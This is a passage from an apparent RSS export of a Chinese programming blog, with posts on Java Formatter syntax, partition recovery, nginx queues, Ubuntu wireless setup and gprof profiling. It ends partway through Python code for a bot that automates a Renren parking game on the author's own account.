</TD></TR></TR></TR></TR></TR></TR></TR></TR></TR></TR></TR></TR></TR></TABLE>  </P><P>以下转换字符用来格式化日期：   <TABLE cellPadding="5" summary="date" >  <TBODY>  <TR>  <TD vAlign="top" ><TT>'B'</TT>   </TD><TD vAlign="top" ><TT>'\B'</TT>   </TD><TD>特定于语言环境的<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/text/DateFormatSymbols.html#getMonths()"  >完整月份名称</A>，例如 <TT>"January"</TT> 和 <TT>"February"</TT>。   </TD><TR>  <TD vAlign="top" ><TT>'b'</TT>   </TD><TD vAlign="top" ><TT>'\b'</TT>   </TD><TD>特定于语言环境的<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/text/DateFormatSymbols.html#getShortMonths()"  >月份简称</A>，例如 <TT>"Jan"</TT> 和 <TT>"Feb"</TT>。   </TD><TR>  <TD vAlign="top" ><TT>'h'</TT>   </TD><TD vAlign="top" ><TT>'\h'</TT>   </TD><TD>与 <TT>'b'</TT> 相同。   </TD><TR>  <TD vAlign="top" ><TT>'A'</TT>   </TD><TD vAlign="top" ><TT>'\A'</TT>   </TD><TD>特定于语言环境的<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/text/DateFormatSymbols.html#getWeekdays()"  >星期几</A>的全称，例如 <TT>"Sunday"</TT> 和 <TT>"Monday"</TT>   </TD><TR>  <TD vAlign="top" ><TT>'a'</TT>   </TD><TD vAlign="top" ><TT>'\a'</TT>   </TD><TD>特定于语言环境的<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/text/DateFormatSymbols.html#getShortWeekdays()"  >星期几</A>的简称，例如 <TT>"Sun"</TT> 和 <TT>"Mon"</TT>   </TD><TR>  <TD vAlign="top" ><TT>'C'</TT>   </TD><TD vAlign="top" ><TT>'\C'</TT>   </TD><TD>除以 <TT>100</TT> 的四位数表示的年份，被格式化为必要时带前导零的两位数，即 <TT>00 - 99</TT>   </TD><TR>  <TD vAlign="top" ><TT>'Y'</TT>   </TD><TD vAlign="top" ><TT>'\Y'</TT>   </TD><TD>年份，被格式化为必要时带前导零的四位数（至少），例如 <TT>0092</TT> 等于格里高利历的 <TT>92</TT> CE。   </TD><TR>  <TD vAlign="top" ><TT>'y'</TT>   </TD><TD vAlign="top" ><TT>'\y'</TT>   </TD><TD>年份的最后两位数，被格式化为必要时带前导零的两位数，即 <TT>00 - 99</TT>。   </TD><TR>  <TD vAlign="top" ><TT>'j'</TT>   </TD><TD vAlign="top" ><TT>'\j'</TT>   </TD><TD>一年中的天数，被格式化为必要时带前导零的三位数，例如，对于格里高利历是 <TT>001 - 366</TT>。<TT>001</TT> 对应于一年中的第一天。   </TD><TR>  <TD vAlign="top" ><TT>'m'</TT>   </TD><TD vAlign="top" ><TT>'\m'</TT>   </TD><TD>月份，被格式化为必要时带前导零的两位数，即 <TT>01 - 13</TT>，其中 "<TT>01</TT>" 是一年的第一个月，("<TT>13</TT>" 是支持阴历所需的一个特殊值）。   </TD><TR>  <TD vAlign="top" ><TT>'d'</TT>   </TD><TD vAlign="top" ><TT>'\d'</TT>   </TD><TD>一个月中的天数，被格式化为必要时带前导零的两位数，即 <TT>01 - 31</TT>，其中 "<TT>01</TT>" 是一个月的第一天。   </TD><TR>  <TD vAlign="top" ><TT>'e'</TT>   </TD><TD vAlign="top" ><TT>'\e'</TT>   </TD><TD>一个月中的天数，被格式化为两位数，即 <TT>1 - 31</TT>，其中 "<TT>1</TT>" 是一个月中的第一天。 </TD></TR></TR></TR></TR></TR></TR></TR></TR></TR></TR></TR></TR></TABLE>  </P><P>以下转换字符用于格式化常见的日期/时间组合。   <TABLE cellPadding="5" summary="composites" >  <TBODY>  <TR>  <TD vAlign="top" ><TT>'R'</TT>   </TD><TD vAlign="top" ><TT>'\R'</TT>   </TD><TD>24 小时制的时间，被格式化为 <TT>"%tH:%tM"</TT>   </TD><TR>  <TD vAlign="top" ><TT>'T'</TT>   </TD><TD vAlign="top" ><TT>'\T'</TT>   </TD><TD>24 小时制的时间，被格式化为 <TT>"%tH:%tM:%tS"</TT>。   </TD><TR>  <TD vAlign="top" ><TT>'r'</TT>   </TD><TD vAlign="top" ><TT>'\r'</TT>   </TD><TD>12 小时制的时间，被格式化为 <TT>"%tI:%tM:%tS %Tp"</TT>。上午或下午标记 (<TT>'%Tp'</TT>) 的位置可能与地区有关。   </TD><TR>  <TD vAlign="top" ><TT>'D'</TT>   </TD><TD vAlign="top" ><TT>'\D'</TT>   </TD><TD>日期，被格式化为 <TT>"%tm/%td/%ty"</TT>。   </TD><TR>  <TD vAlign="top" ><TT>'F'</TT>   </TD><TD vAlign="top" ><TT>'\F'</TT>   </TD><TD><A rel="nofollow" href="http://www.w3.org/TR/NOTE-datetime"  >ISO&nbsp;8601</A> 格式的完整日期，被格式化为 <TT>"%tY-%tm-%td"</TT>。   </TD><TR>  <TD vAlign="top" ><TT>'c'</TT>   </TD><TD vAlign="top" ><TT>'\c'</TT>   </TD><TD>日期和时间，被格式化为 <TT>"%ta %tb %td %tT %tZ %tY"</TT>，例如 <TT>"Sun Jul 20 16:17:00 EDT 1969"</TT>。 </TD></TR></TR></TR></TR></TR></TR></TABLE>  </P><P>应用为<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#dFlags"  >常规转换</A>而定义的 <TT>'-'</TT> 标志。如果给出 <TT>'#'</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。 <A rel="nofollow" ></A>  </P><P>宽度是将向输出中写入的最少字符数。如果转换值的长度小于 <TT>width</TT>，则用空格(<TT>'\ '</TT>) 来填充输出，直到总字符数等于宽度。默认情况下，在左边进行填充。如果给出 <TT>'-'</TT> 标志，则在右边进行填充。如果没有指定宽度，则没有最小宽度。   </P><P>精度不适用。如果指定了精度，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/IllegalFormatPrecisionException.html"  ><CODE>IllegalFormatPrecisionException</CODE></A>。 <A rel="nofollow" >  <H4>百分比 </H4></A>  </P><P>该转换不对应于任何参数。   <TABLE cellPadding="5" summary="DTConv" >  <TBODY>  <TR>  <TD vAlign="top" ><TT>'%'</TT>   </TD><TD>结果是一个字面值 <TT>'%'</TT> (<TT>'\%'</TT>) <A rel="nofollow" ></A>  <P>宽度是将向输出中写入的最少字符数，包括 <TT>'%'</TT>。如果转换值的长度小于 <TT>width</TT>，则用空格 (<TT>'\ '</TT>) 来填充输出，直到总字符数等于宽度。在左边进行填充。如果没有指定宽度，则只输出 <TT>'%'</TT>。   </P><P>应用为<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#dFlags"  >常规转换</A>而定义的 <TT>'-'</TT> 标志。如果提供其他任何标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。   </P><P>精度不适用。如果指定精度，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/IllegalFormatPrecisionException.html"  ><CODE>IllegalFormatPrecisionException</CODE></A>。 </P></TD></TR></TABLE><A rel="nofollow" >  <H4>行分隔符 </H4></A>  </P><P>该转换不对应于任何参数。   <TABLE cellPadding="5" summary="DTConv" >  <TBODY>  <TR>  <TD vAlign="top" ><TT>'n'</TT>   </TD><TD>由 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/System.html#getProperty(java.lang.String)"  ><CODE>System.getProperty("line.separator")</CODE></A> 返回的特定于平台的行分隔符。 </TD></TR></TABLE>  </P><P>标志、宽度和精度都不可用。如果提供这三者，则会分别抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/IllegalFormatFlagsException.html"  ><CODE>IllegalFormatFlagsException</CODE></A>、<A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/IllegalFormatWidthException.html"  ><CODE>IllegalFormatWidthException</CODE></A> 和 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/IllegalFormatPrecisionException.html"  ><CODE>IllegalFormatPrecisionException</CODE></A>。 <A rel="nofollow" >  <H4>参数索引 </H4></A>  </P><P>格式说明符可以通过三种方式引用参数：   </P><UL>  <LI><I>显式索引</I> 是在格式说明符中包含参数索引时使用。参数索引是一个十进制整数，用于指示参数在参数列表中的位置。第一个参数由 "<TT>1$</TT>" 引用，第二个参数由 "<TT>2$</TT>" 引用，依此类推。可以多次引用任何一个参数。   <P>例如：   </P><BLOCKQUOTE><PRE>   formatter.format("%4$s %3$s %2$s %1$s %4$s %3$s %2$s %1$s",                      "a", "b", "c", "d")     // -&gt; "d c b a d c b a"   </PRE></BLOCKQUOTE>  </LI><LI><I>相对索引</I> 是在格式说明符中包含 <TT>'&lt;'</TT> (<TT>'\< TT>) 标志时使用，该标志将导致重用以前格式说明符的参数。如果不存在以前的参数，则抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/MissingFormatArgumentException.html"  ><CODE>MissingFormatArgumentException</CODE></A>。   <BLOCKQUOTE><PRE>    formatter.format("%s %s %&lt;s %&lt;s", "a", "b", "c", "d")      // -&gt; "a b b b"      // "c" and "d" are ignored because they are not referenced   </PRE></BLOCKQUOTE>  </LI><LI><I>普通索引</I> 在格式说明符中既不包含参数索引也不包含 <TT>'&lt;'</TT> 标志时使用。每个使用普通索引的格式说明符都分配了一个连续隐式索引，分配在独立于显式索引或相对索引使用的参数列表中。   <BLOCKQUOTE><PRE>   formatter.format("%s %s %s %s", "a", "b", "c", "d")     // -&gt; "a b c d"   </PRE></BLOCKQUOTE></LI></UL>  <P>可能有一个使用所有索引形式的格式字符串，例如：   </P><BLOCKQUOTE><PRE>   formatter.format("%2$s %s %&lt;s %s", "a", "b", "c", "d")     // -&gt; "b a a b"     // "c" and "d" are ignored because they are not referenced</PRE></BLOCKQUOTE>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720076128375340/</guid>
    </item>
    <item>
      <title>
<![CDATA[巨牛的DiskGenius，巨矬的Windows磁盘管理器]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720104243411467/</link>
      <description>
<![CDATA[使用Windos的磁盘管理器格式化一个分区，结果崩溃退出了，然后发现原来的7个分区只剩下两个了。<br>原来六个分区，XP系统+软件+项目+空分区+Linux启动分区+Linux根分区+Win7系统，只剩下XP系统和软件分区了！<br>瞬间崩溃，Win7可以重装，Linux可以重装，可以项目分区里，有所有代码、电子书、简历等等，要命啊<br>祭出DiskGenius，“搜索分区”，找到5个，项目和空分区识别为同一个分区，Linux两个分区识别为一个分区，保存分区表，修复MBR，重启，提示找不到分区！，原来用DiskGenius时将XP系统分区识别作扩展分区了<br>作用WinPE启动，重新使用DiskGenius重建分区表，一切OK！]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Admin</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720104243411467/</guid>
    </item>
    <item>
      <title>
<![CDATA[REST in axis2]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720083302146591/</link>
      <description>
<![CDATA[REST - An Architectural Style, Not a Standard.<br>&nbsp;REST(Representational State Transfer，表述性状态转移)是一种针对网络应用的设计和开发方式，可以降低开发的复杂性，提高系统的可伸缩性。REST提出了一些设计概念和准则：<br>  1.网络上的所有事物都被抽象为资源（resource）； <br>  2.每个资源对应一个唯一的资源标识（resource identifier）； <br>  3.通过通用的连接器接口（generic connector interface）对资源进行操作； <br>  4.对资源的各种操作不会改变资源标识； <br>  5.所有的操作都是无状态的（stateless）<br><br>                          目前宣称支持<span ><span >REST</span></span>的<span ><span >Java</span></span>框架包括以下这些：  <br><span ><span >Rest</span></span>let（<a target="_blank" rel="nofollow" href="http://www.restlet.org/"  >http://www.<span ><span >rest</span></span>let.org/</a>）  <br>Cetia4（<a target="_blank" rel="nofollow" href="https://cetia4.dev.java.net/"  >https://cetia4.dev.<span ><span >java</span></span>.net/</a>）  <br>Apache Axis2（<a target="_blank" rel="nofollow" href="http://http//ws.apache.org/axis2/"  >http://http://ws.apache.org/axis2/</a>）  <br>sql<span ><span >REST</span></span>（<a target="_blank" rel="nofollow" href="http://sqlrest.sourceforge.net/"  >http://sql<span ><span >rest</span></span>.sourceforge.net/</a>）  <br><span ><span >REST</span></span>-art（<a target="_blank" rel="nofollow" href="http://rest-art.sourceforge.net/"  >http://<span ><span >rest</span></span>-art.sourceforge.net/</a>）  <br>  <br><br>Reference:<br>http://www.xfront.com/REST-Web-Services.html<br>REST in axis2: http://ws.apache.org/axis2/1_2/rest-ws.html<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720083302146591/</guid>
    </item>
    <item>
      <title>
<![CDATA[三国杀随想]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720119231733885/</link>
      <description>
<![CDATA[三国杀AI, 需要的<wbr>几个变量:<br><wbr>武将, 单个武将的参数确定, 双武将, 多武将之间的配合方式是个扩展点<br>距离, 本身距离+武将距离+装备<br>角色, 角色的判断, 尤其是第一轮中的判断, 以及伪装的判断, 内的判断<br>手牌, 根据之前的出牌情况, 推测手牌<br>策略, 多人集中打1人<br><br>可以先固定一个武将, 使用选将功能稳定运行, 然后逐步增加复杂度.<br>使用油猴脚本来实现, 可视化效果.]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720119231733885/</guid>
    </item>
    <item>
      <title>
<![CDATA[nginx的数据结构(3) 队列ngx_queue_s]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201091293749946/</link>
      <description>
<![CDATA[nginx 的队列定义在 core/ngx_queue.h中<br>struct ngx_queue_s {<br>&nbsp;&nbsp;&nbsp; ngx_queue_t&nbsp; *prev;<br>&nbsp;&nbsp;&nbsp; ngx_queue_t&nbsp; *next;<br>};<br>首先这个队列很奇怪，因为它只有上一元素与下一元素的指针，却没有数据的结构成员。<br>那么它是如何存储与取得队列节点中的数据呢？看core/ngx_queue.h中的定义：<br>#define ngx_queue_data(q, type, link)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \<br>&nbsp;&nbsp;&nbsp; (type *) ((u_char *) q - offsetof(type, link))<br>其实ngx_queue只是一个幌子，真正存储在队列中的元素是包含ngx_queue成员的结构。换句话说：如果一个结构想使用队列的方式存储，那么这个结构就要包含ngx_queue成员。<br><br><b>offset</b><br>这里用到了C语言的一个技巧：offsetof 函数：根据结构的成员的指针定位结构的指针：理解了这个，ngx_queue 就明白了。<br>例如<br>struct x_s{<br>&nbsp;int a;<br>&nbsp;int b;<br>} x;<br>则 &amp;x.b = ＆x + (&amp;x.b - &amp;x) = &amp;x + offsetof(struct x_s, b);<br>所以只要一个结构里有ngx_queue成员，就可以根据ngx_queue成员的指针获得这个结构的指针。<br>如http/ngx_http_cache.h中的ngx_http_file_cache_node_t结构，包含一个ngx_queue的成员queue，然后在http/ngx_http_file_cache.c文件中采用这种方法从队列中获取结构：<br>ngx_http_file_cache_node_t *fcn = ngx_queue_data(q, ngx_http_file_cache_node_t, queue);<br>根据上面的ngx_queue_data的定义: type=ngx_http_file_cache_node_t, offset=queue，所以可以展开为：<br>ngx_http_file_cache_node_t *fcn = <br>(ngx_http_file_cache_node_t*) ((u_char*)q - offset(ngx_http_file_cache_node_t, queue));<br>ngx_http_file_cache_node结构如下所示：<br>+-------+---------+----+<br>| node | queue | ...&nbsp; |<br>+-------+---------+----+<br>结构的起始指针 = queue的起始位置 - queue在结构内的偏移.<br><br>nginx 的一个四节点的队列 ngx_queue 如下所示：<br>1的next指向2，2的next指向3，3的next指向4，4的next指向1<br>2的prev指向1，3的prev指向2，4的prev指向3，1的prev指向4<br>每个要使用队列存储的结构必须包含ngx_queue成员，有点像继承，其实是组合，组合优于继承！<br><div><img title="nginx的数据结构(3) 队列ngx_queue_s - hankjin - 云水居" alt="nginx的数据结构(3) 队列ngx_queue_s - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img.ph.126.net/X0JOadhePkhf5UxKVHKUfw==/3715188217604423853.png"></div>&nbsp;<br>nginx 的队列基本操作和传统队列没有什么区别，基本都用宏的方式定义在core/ngx_queue.h中，与众不同的操作有两个，定义在core/ngx_queue.c中：<br><b>取队列中间元素：<br></b>从ngx_queue的定义可以看出，nginx 的队列设计非常简单，没有存储队列的长度信息。所以要取得队列中间的一个元素，最简单的方法是：先遍历队列计算出队列长度n，然后再从队列头走n/2步，就找到队列中间的元素了。算法复杂度为O(n)+O(n/2)=O(3n/2)<br>但 nginx 没有采取这种方式，而是用了两个指针，一个步长为1,另一个步长为2,同时向前移动，当步长为2的指针到达队列末尾的时候，步长为1的指针刚好在队列的开头。<br>算法复杂度也是O(n)+(n/2)=O(3n/2)<br>但它的优点有两个，一是局部性较好，二是代码比较优雅。一个循环比两个循环看起来好看一些:)。<br>代码见core/ngx_queue.c的ngx_queue_middle函数：<br>&nbsp;&nbsp;&nbsp; middle = ngx_queue_head(queue);&nbsp; //步长为1的指针m<br>&nbsp;&nbsp;&nbsp; next = ngx_queue_head(queue);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //步长为2的指针n<br>&nbsp;&nbsp;&nbsp; for ( ;; ) {//遍历队列 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; middle = ngx_queue_next(middle);&nbsp;&nbsp;&nbsp; //m走一步<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; next = ngx_queue_next(next);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //n走一步<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (next == ngx_queue_last(queue)) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return middle;//n到头了<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; next = ngx_queue_next(next);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //n再走一步<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (next == ngx_queue_last(queue)) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return middle;//n到头了<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp; <br><b><br>队列排序：</b><br>排序算法主要有插入，选择，快排，堆排等，考虑到队列没有随机访问能力的问题，使用插入排序是队列排序的一个较好的选择，而 nginx 也确实选用了这种方法：<br>从队列的第2个节点开始，针对每个节点，先从队列里拿出来，然后再向前找适当的位置，再插入。<br>代码见core/ngx_queue.c的ngx_queue_sort函数：<br>&nbsp;&nbsp;&nbsp; q = ngx_queue_head(queue);<br>&nbsp;&nbsp;&nbsp; for (q = ngx_queue_next(q); q != ngx_queue_sentinel(queue); q = next) { //2-n<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; prev = ngx_queue_prev(q); //记录前一个节点<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; next = ngx_queue_next(q);&nbsp; //记录后一个节点<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_queue_remove(q);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //1。先把当前节点从队列中取出<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; do {&nbsp;&nbsp; //2。向前查找，找到插入的位置(即比当前节点小的节点)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (cmp(prev, q) &lt;= 0)&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; prev = ngx_queue_prev(prev);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } while (prev != ngx_queue_sentinel(queue));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_queue_insert_after(prev, q);//3。插入当前节点。。<br>&nbsp;&nbsp;&nbsp; }<br>}<br>例如<br>有一个int 队列：<br>2 3 5 8 4 6 9<br>进行到第5个元素4时，首先将4从中取出，<br>2 3 5 8 6 9<br>然后向前查，8－5－3，发现3比4小，则在3后面插入4<br>2 3 4 5 8 6 9<br>接着处理下一个节点6]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201091293749946/</guid>
    </item>
    <item>
      <title>
<![CDATA[Dell Inspiron1300戴尔笔记本无线上网]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720101027113231775/</link>
      <description>
<![CDATA[1。首先打开无线网卡<br>按Fn+F2 打开/关闭无线网卡，第四个指示灯表示无线网卡处于打开还是关闭状态<br><br><wbr>2。首先安装驱动程序<br>System-&gt;Administration-&gt;Additional Drivers<br><div><img title="Dell Inspiron1300戴尔笔记本无线上网 - hankjin - 云水居" alt="Dell Inspiron1300戴尔笔记本无线上网 - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img74.ph.126.net/wNNjI8PBXIJLTaat_Yr9Ew==/1853794196618454674.png" height="439" width="341"></div>如果是上图的状态，则表示驱动已经安装好了，如果不是，则会有一个Activate按钮，点击激活无线网卡。<br><br>2。设置无线路由<br>System-&gt;Preferences-&gt;Network Connections，然后切换到Wireless选项卡<br><div><img title="Dell Inspiron1300戴尔笔记本无线上网 - hankjin - 云水居" alt="Dell Inspiron1300戴尔笔记本无线上网 - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img313.ph.126.net/gN2HbUtqM5zeSV4x2AyoHQ==/3681692695376149239.png" height="200" width="263"><br>如果已经有了无线连接，则按Edit按钮编辑，如果没有，则按Add按钮添加无线连接 <br><div><img title="Dell Inspiron1300戴尔笔记本无线上网 - hankjin - 云水居" alt="Dell Inspiron1300戴尔笔记本无线上网 - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img74.ph.126.net/SUktMgvoyFIpi-oiQLWD6g==/1848446172060548423.png" height="406" width="297"></div></div>主要填写SSID，勾选Available to all users，然后Apply即可<br><br>3。启用DHCP<br>默认DHCP应该是安装并处于启动状态的，如果不确定，可以执行这个命令启动DHCP<br>sudo apt-get install dhcp-client<br>Game Over!<br>好像网易博客不能在 Ubuntu 下上传图片，悲剧]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720101027113231775/</guid>
    </item>
    <item>
      <title>
<![CDATA[快速分析代码gprof+graphviz]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372011770453139/</link>
      <description>
<![CDATA[分三步:<br><br><wbr><b>1. 首先编译代码</b><br>make -CFLAGS=-pg -CXXFLAGS=-pg<br><br><b>2. 然后运行</b><br>./myexe<br><br><b>3. 最后生成流程图</b><br>gprof ./myexe gmon.out | gprof2dot.py&nbsp; | dot -Tpng -o myexe.png<br><br>附: gprof2dot.py<br>http://jrfonseca.googlecode.com/svn/trunk/gprof2dot/gprof2dot.py<br>注意运行程序要正常退出,使用kill -9时不会生成gmon.out. 可以在程序中添加代码,增加一个signal进行退出]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>C/C++</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372011770453139/</guid>
    </item>
    <item>
      <title>
<![CDATA[校内网抢车位外挂Python源码(已测试)]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009825211129/</link>
      <description>
<![CDATA[功能很弱，每小时检查一下自己的车和车位<br>自己车位上的每辆车，够10000或15000就认为已经到达上限，自动贴条<br>自己的每辆车，达到最大收入后，自动移动车位。<br>#!/usr/bin/python<br>#encoding: utf-8<br>imp<wbr>ort urllib,urllib2,cookielib<br>imp<wbr>ort re,time<br>imp<wbr>ort json<br><br>class Park:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;autoPark = True<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;autoPaste = True<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def __init__(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;cj=cookielib.CookieJar()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;opener.addheaders=[('User-Agent','Mozilla')]<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;urllib2.install_opener(opener)<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def req(self,url,body=None):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;req=urllib2.Request(url)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if body==None:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return urllib2.urlopen(req).read()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return urllib2.urlopen(req,urllib.urlencode(body)).read()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def login(self,email,password):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url="http://login.renren.com/Login.do"<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body=(("email",email),("password",password))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;ret=self.req(url,body)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;uids=re.findall('http\:\/\/renren\.com\/profile\.do\?id\=(\d+)',ret)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if len(uids)&gt;0:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.uid=uids[0] <br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 